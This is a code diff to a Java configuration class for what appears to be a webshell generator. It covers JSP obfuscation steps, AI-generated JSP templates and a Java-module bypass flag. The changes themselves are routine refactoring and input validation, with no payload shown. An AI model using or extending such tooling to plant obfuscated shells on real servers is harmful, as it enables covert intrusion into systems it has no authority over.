@@ -4,6 +4,11 @@ package org.leo.jmg;
 import org.leo.core.entity.Disguise;
 import org.leo.core.util.request.ClassNameGenerator;
 
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.Locale;
+
 /**
  * Shell生成器配置类
  * 用于配置Shell生成器的各种参数
@@ -47,7 +52,7 @@ public class ShellGeneratorConfig {
      * 用户自定义 JSP/JSPX 混淆步骤 ID 列表（有序）。
      * 为 null 或空时 JSP Packer 使用默认 preset；非空时按此顺序构建 pipeline。
      */
-    private java.util.List<String> jspObfuscationSteps;
+    private List<String> jspObfuscationSteps;
 
     /**
      * AI 生成的自定义 JSP 模板（含 {{VAR:}} / {{CLS:}} / {{base64Str}} 占位符）。
@@ -158,6 +163,9 @@ public class ShellGeneratorConfig {
          * 设置响应码
          */
         public Builder respCode(int respCode) {
+            if (respCode < 100 || respCode > 599) {
+                throw new IllegalArgumentException("respCode 必须在 100 到 599 之间，当前值: " + respCode);
+            }
             config.respCode = respCode;
             return this;
         }
@@ -170,7 +178,7 @@ public class ShellGeneratorConfig {
          */
         public Builder protocol(String protocol) {
             if (protocol != null && !protocol.trim().isEmpty()) {
-                String protocolLower = protocol.toLowerCase();
+                String protocolLower = protocol.trim().toLowerCase(Locale.ROOT);
                 if ("http".equals(protocolLower) || "httpchunk".equals(protocolLower)) {
                     config.protocol = protocolLower;
                 } else {
@@ -276,8 +284,10 @@ public class ShellGeneratorConfig {
             return this;
         }
 
-        public Builder jspObfuscationSteps(java.util.List<String> steps) {
-            config.jspObfuscationSteps = steps;
+        public Builder jspObfuscationSteps(List<String> steps) {
+            config.jspObfuscationSteps = steps == null
+                    ? null
+                    : Collections.unmodifiableList(new ArrayList<String>(steps));
             return this;
         }
 
@@ -362,7 +372,7 @@ public class ShellGeneratorConfig {
         return byPassJavaModule;
     }
 
-    public java.util.List<String> getJspObfuscationSteps() {
+    public List<String> getJspObfuscationSteps() {
         return jspObfuscationSteps;
     }
 
@@ -445,4 +455,3 @@ public class ShellGeneratorConfig {
     }
 
 }
-
